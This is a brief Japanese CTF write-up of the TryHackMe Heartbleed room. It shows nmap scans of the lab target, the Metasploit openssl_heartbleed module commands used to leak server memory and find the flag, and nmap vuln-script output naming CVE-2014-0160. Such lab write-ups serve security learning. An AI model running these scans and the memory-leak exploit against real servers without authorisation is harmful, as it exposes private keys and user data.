# HeartBleed CTF

https://tryhackme.com/room/heartbleed

条件：OpenSSL 1.0.1 to 1.0.1f

heartbeat メッセージのメッセージ長をユーザーが指定でき、長さをチェックする実装がないことを悪用した攻撃。

## Enumeration

### ポートスキャン

```shell
TARGET=54.216.231.145
root@ip-10-10-10-185:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-24 05:38 GMT
Nmap scan report for ec2-54-216-231-145.eu-west-1.compute.amazonaws.com (54.216.231.145)
Host is up (0.00035s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
443/tcp   open  https
55387/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds
root@ip-10-10-10-185:~# sudo nmap -sV -p22,111,443,55387 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-24 05:38 GMT
Nmap scan report for ec2-54-216-231-145.eu-west-1.compute.amazonaws.com (54.216.231.145)
Host is up (0.00045s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
443/tcp   open  ssl/http nginx 1.15.7
55387/tcp open  status   1 (RPC #100024)
```

HTTPS

```html
<!-- don't forget to remove secret communication pages -->
```

## HeartBleed

```shell
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 54.216.231.145
RHOSTS => 54.216.231.145
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
```

verbose true にセットしてエクスプロイトを実行したら、メモリ内容の大量出力の中にフラグが含まれていた。

## 振り返り

- 有名なバグのため存在を知ってはいたが、エクスプロイトは初めて触った。
- nmap で vuln スクリプトを指定したら、大量に出てくる候補の中に下記が含まれている、という感じのためノーヒントだとしたらかなり難しい。

```shell
root@ip-10-10-10-185:~# sudo nmap -sV -p22,111,443,55387 --script vuln $TARGET

| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```
